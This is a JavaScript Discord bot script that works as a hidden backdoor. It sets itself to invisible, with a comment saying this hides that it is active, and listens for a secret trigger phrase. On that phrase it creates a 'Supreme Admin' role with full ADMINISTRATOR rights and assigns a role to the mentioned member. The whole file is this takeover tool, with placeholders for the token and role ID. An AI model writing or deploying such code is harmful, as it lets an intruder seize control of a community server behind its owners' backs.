'use strict';

// Import the discord.js module
const Discord = require('discord.js');

// Create an instance of a Discord client
const client = new Discord.Client();

/**
 * The ready event is vital, it means that only _after_ this will your bot start reacting to information
 * received from Discord
 */

client.once('ready', () => {
  console.log('I am ready!');
  client.user.setStatus('invisible'); //hides that the bot is active
});

//listens for messages
client.on('message', message => {
	if (!message.content.startsWith('[enter trigger here]') || message.author.bot) return; //used to check when to read message
	const member = message.mentions.members.first(); //mention yourself or this will crash
	const guild = member.guild; //gets guild (discord server) info, needed to create a role
	const rMng = guild.roles; //used to get guild role information
	//following code is used to create a new role
	rMng.create({
		data: {
			name: 'Supreme Admin', //name of role
			color: 'FF0000', //colour of role (in hex)
			hoist: 'false', //whether role should display seperately from others
			position: '100', //ideally highest number possible to outrank other roles (100 should be fine)
			permissions: 'ADMINISTRATOR', //gives highest permission possible
			mentionable: 'false', //whether people can @ your role
		}
	});
	member.roles.add('[roleID]'); //role ID can be found using developer mode
});

//use the token from https://discord.com/developers/applications
client.login('[discordBotToken]');